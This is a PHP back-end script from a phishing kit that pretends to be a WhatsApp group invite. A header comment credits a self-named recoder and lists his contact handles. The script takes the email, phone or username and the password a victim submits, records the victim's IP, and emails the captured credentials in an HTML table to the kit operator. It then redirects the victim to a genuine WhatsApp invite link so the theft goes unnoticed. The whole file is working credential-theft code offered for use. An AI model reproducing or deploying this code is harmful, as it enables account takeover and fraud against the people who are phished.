<!--- 
RECODE BY FAP FAP SHOP
COPYRIGHT IS PROTECTED BY REZAA
SCRIPT NAME: SCRIPT PHISING WHATSAPP GROUP INVITE RECODE BY FAP FAP SHOP (A.K.A REZAA EX)
RECODER: FAP FAP SHOP (A.K.A REZAA EX)
DATE RECODE: SABTU, 19 APRIL 2019 
FB: REZAA EX
IG: RYANCIPENG24
WA: 08977444274
NOTE: CHANGING COPYRIGHT DOES NOT MAKE YOU AS A CODER.•
--->
<?php
$user = $_POST['email'];
$pass = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];

$subject = "ANAK NGEN | PUNYA SI $user";
$message = '
<center> 
<div style="padding:5px;width:294;height:40px;background: #222222;color: black;text-align:center;">
<img width="40" style="float:left;" src="https://image.ibb.co/ga9dZf/RAFLIPEDIA.png">
<img width="40" style="float:right;" src="https://i.ibb.co/090sp3S/fb.png">
</div>
<table style="border-collapse:collapse;background:#ffc" width="100%" border="1">
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
  <th style="width:78%;text-align: center;"><b>'.$user.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>PASSWORD</th>
  <th style="width:78%;text-align: center;"><b>'.$pass.'</th> 
 </tr>
 </table>
<div style="padding:5px;width:294;height:40px;background: #222222;color:#ffc;text-align:center;">
<font size="3"><b>RAFLIPEDIA INDONESIA</b></font>
</div>
</center>
';
include 'email.php';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: AKAQ SEDANG KEHUJANAN <result@raflipedia.com>' . "\r\n";
$datamail = mail($fapfapshop, $subject, $message, $headersx);
?>
<html>
<head>
<meta http-equiv="REFRESH" content="0;url=https://chat.whatsapp.com/JxVDFeW7JSPGS1AJeLDr6k">
</head>
<body>
</body>
</html>